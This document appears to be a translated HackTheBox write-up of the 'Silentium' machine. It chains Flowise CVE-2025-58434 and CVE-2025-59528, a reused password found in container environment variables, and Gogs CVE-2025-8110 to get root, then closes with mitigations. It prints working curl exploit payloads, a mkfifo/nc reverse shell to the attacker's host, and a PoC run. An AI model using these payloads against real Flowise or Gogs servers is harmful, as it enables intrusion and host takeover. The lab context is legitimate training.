Here's the English translation of the writeup:

---

# HackTheBox — Silentium

**OS:** Linux (Ubuntu 24.04)
**Entry point:** Web (Flowise on staging) → Docker container → SSH as ben → Gogs → CVE-2025-8110 → root

---

## 

The subdomain `staging.silentium.htb` hosts **Flowise 3.0.5** with two vulnerabilities: unauthenticated password reset (CVE-2025-58434) and RCE (CVE-2025-59528). Through them we get **root inside a Docker container**, from which we extract the password `r04D!!_R4ge` from environment variables for the SSH user `ben`. Next — Gogs on `127.0.0.1:3001`, we exploit **CVE-2025-8110** and get **root on the host** (Gogs runs with `RUN_USER = root`).

---

## 1. Enumeration

### Nmap

```bash
nmap -T4 -A -v 10.129.144.227
```

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
```

Nmap reports a redirect — add the host to `/etc/hosts`:

```bash
echo "10.129.144.227  silentium.htb" | sudo tee -a /etc/hosts
```

### Virtual host fuzzing

There's nothing interesting on `silentium.htb`, but it's a virtual host. We fuzz subdomains:

```bash
ffuf -H 'Host: FUZZ.silentium.htb' \
     -u http://silentium.htb \
     -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -fs 178
```

Result:

```
staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 19ms]
```

Add it to hosts:

```bash
echo "10.129.144.227  staging.silentium.htb" | sudo tee -a /etc/hosts
```

On `staging.silentium.htb` there's **Flowise**, asking for login. Default credentials don't work, and no version is shown.

---

## 2. Foothold — Flowise

### CVE-2025-58434 — unauthenticated password reset

We check the Flowise repository for recent CVEs — we find **CVE-2025-58434**: unauthenticated password reset. A valid email is required.

On the `silentium.htb` main page there are three names: **Marcus Thorne**, **Ben**, and **Elena Rossi**. We try `ben@silentium.htb`:

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
     -H "Content-Type: application/json" \
     -d '{"user":{"email":"ben@silentium.htb"}}' | jq .
```

Response:

```json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG",
    "tempToken": "Y7Lu3Z5j52Hjc75m5nJr41ocV7Zuti78FLQl6fb2uppIw60QkfUiE9s9adpTdD83",
    "tokenExpiry": "2026-05-24T21:30:43.390Z",
    "status": "active",
    ...
  }
}
```

We got the `tempToken`. Now we reset the password:

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
     -H "Content-Type: application/json" \
     -d '{
       "user":{
         "email":"ben@silentium.htb",
         "tempToken":"Y7Lu3Z5j52Hjc75m5nJr41ocV7Zuti78FLQl6fb2uppIw60QkfUiE9s9adpTdD83",
         "password":"NewPassword"
       }
     }'
```

Response `200 OK` — password reset.

### Login and version identification

We log in with `ben@silentium.htb` / `NewPassword`. In the top-right corner — the gear icon, where the version is shown:

```
Flowise 3.0.5
```

This is vulnerable to **CVE-2025-59528** — RCE.

### CVE-2025-59528 — RCE

We generate an API key in the left panel (or use the default one). We verify RCE by pinging our web server:

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer <API_KEY>" \
     -d '{
       "loadMethod": "listActions",
       "inputs": {
         "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"ping -c 1 10.10.14.144\");return 1;})()})"
       }
     }'
```

The ping arrived — we swap it for a reverse shell:

```bash
# listener
nc -lvnp 4444

# exploit
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer <API_KEY>" \
     -d '{
       "loadMethod": "listActions",
       "inputs": {
         "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.144 4444 >/tmp/f\");return 1;})()})"
       }
     }'
```

We get **root inside the Docker container**.

---

## 3. Shell as ben

Inside the container we're root, but we need to break out to the host. We check environment variables:

```bash
env
```

We find:

```
FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
SMTP_PASSWORD=r04D!!_R4ge
SMTP_USERNAME=test
SENDER_EMAIL=ben@silentium.htb
```

The password `r04D!!_R4ge` works for the SSH user `ben` on the host:

```bash
ssh ben@silentium.htb
# password: r04D!!_R4ge
```

> If ssh hangs at `expecting SSH2_MSG_KEX_ECDH_REPLY` — lower the MTU:
> ```bash
> sudo ip link set dev tun0 mtu 1200
> ```

We're on the host as `ben`.

---

## 4. Host reconnaissance

```bash
ben@silentium:~$ ss -tlnp
```

We see Gogs on `127.0.0.1:3001` — loopback only, not reachable from outside. We check the config:

```bash
cat /opt/gogs/gogs/custom/conf/app.ini
```

The key line:

```ini
RUN_USER = root
```

Gogs runs **as root** — any RCE through it gives root immediately.

---

## 5. Port Forwarding

We forward `3001` to Kali:

```bash
ssh -N -L 3001:127.0.0.1:3001 ben@silentium.htb
```

Verify:

```bash
curl -s http://localhost:3001 | head
```

```
<!DOCTYPE html>
<html>
<head data-suburl="">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	...
		<meta name="author" content="Gogs" />
```

Gogs is now available locally on Kali. Open `http://localhost:3001`.

---

## 6. CVE-2025-8110 — Gogs RCE

### The vulnerability

Gogs does not check whether the file being overwritten via `PUT /api/v1/repos/.../contents/<file>` is a symlink. An attacker can:

1. Push a symlink `malicious_link -> .git/config`.
2. Use the API to write a malicious `.git/config` containing `sshCommand = <reverse shell>` into it.
3. Gogs follows the symlink and overwrites **its own** `.git/config`.
4. On the next SSH operation, Gogs executes `sshCommand` — RCE.

### Preparation

**Window 1 — listener:**

```bash
nc -lvnp 4444
```

**Window 2 — SSH tunnel (do not close):**

```bash
ssh -N -L 3001:127.0.0.1:3001 ben@silentium.htb
```

**Window 3 — exploit:**

Find your `tun0` IP:

```bash
ip a show tun0 | grep inet
# inet 10.10.14.144/23 ...
```

Run the PoC (adapted for Silentium — with `-un`/`-pw` for an existing user, which bypasses the registration CAPTCHA):

```bash
python3 CVE-2025-8110.py \
  -u http://localhost:3001 \
  -lh 10.10.14.144 \
  -lp 4444 \
  -un NewUsers \
  -pw GogsPassword
```

### Exploit output

```
[+] Authenticated successfully
Token generation status: 200
[+] Application token: 44d191f24805eb4f165162eeb943700496590414
Repo creation status: 201
Cloning into '/tmp/caaafaf0fa74'...
...
[master f5f79a4] Add malicious symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
...
To http://localhost:3001/NewUsers/caaafaf0fa74.git
   8812c81..f5f79a4  master -> master
[+] Exploit sent, check your listener!
[-] Error: HTTPConnectionPool(host='localhost', port=3001): Read timed out. (read timeout=5)
```

> `Read timed out` is an **expected sign of success**. Gogs executed our `sshCommand` and went into the reverse shell instead of responding to the HTTP request.

---

## 7. Root

In the listener window:

```
listening on [any] 4444 ...
connect to [10.10.14.144] from (UNKNOWN) [10.129.144.227] 40198
bash: cannot set terminal process group (1491): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/1# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root immediately**, because `RUN_USER = root`.

### TTY stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

`Ctrl+Z`, then on Kali:

```bash
stty raw -echo; fg
```

Enter, Enter. In the shell:

```bash
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 cols 160
```

---

## 8. Flags

```bash
root@silentium:~# cat /home/ben/user.txt
a44ec12e354a9ae38b0574fc7888a19a

root@silentium:~# cat /root/root.txt
52198fb7afbca1b6bb01ab68db1c6324
```

---

## 9. Summary / Mitigation

### Attack chain

```
Recon (nmap, ffuf)
   └── staging.silentium.htb → Flowise 3.0.5
         ├── CVE-2025-58434 (unauthenticated password reset)
         │     └── access to Flowise admin panel
         └── CVE-2025-59528 (RCE)
               └── root in Docker container
                     └── env: SMTP_PASSWORD=r04D!!_R4ge
                           └── SSH ben@silentium.htb
                                 └── Gogs on 127.0.0.1:3001 (RUN_USER = root)
                                       └── SSH tunnel -L 3001:127.0.0.1:3001
                                             └── CVE-2025-8110 (symlink → .git/config → sshCommand)
                                                   └── RCE as root
                                                         └── root.txt
```

### How to fix

1. **Flowise**: update to a version where CVE-2025-58434 and CVE-2025-59528 are patched. Password reset should require email confirmation, not return a `tempToken` in the API response.
2. **Don't store secrets in container environment variables.** `SMTP_PASSWORD`, `FLOWISE_PASSWORD` — all of this leaks on the first RCE. Use a secret manager.
3. **Don't reuse passwords.** `r04D!!_R4ge` from SMTP worked for SSH — that should never happen.
4. **Gogs**: update to a version where CVE-2025-8110 is patched (symlink validation in the content API).
5. **Don't run Gogs as root.** `RUN_USER = root` turns any RCE into a full host compromise. Always use a dedicated unprivileged user.
6. **Restrict permissions on `.git/config`** — Gogs should not be able to overwrite its own git configs.
7. **Monitoring**: track symlink creation in repositories and suspicious changes to `sshCommand`.

### Things to remember

- `Read timed out` in web exploits is often not an error, but a sign that the payload executed.
- `ssh -N -L` is more reliable than the `~C` escape sequence.
- Always check `env` in a container — secrets are often lying there in plaintext.
- Always check `RUN_USER` in service configs — a common cause of "free" root.
- CVE-2025-8110 is a great example of why you should never trust symlinks when working with file APIs.

### CAPTCHA

Use the Silentium-adapted PoC:
https://github.com/ixZODiAK/CVE-2025-8110

This is a fork of the original zAbuQasem/gogs-CVE-2025-8110, which accepts
the `-un` and `-pw` flags for an already-existing Gogs user —
this bypasses the CAPTCHA enabled on Silentium (`ENABLE_REGISTRATION_CAPTCHA = true`).

**Machine pwned. GG!** 🚀
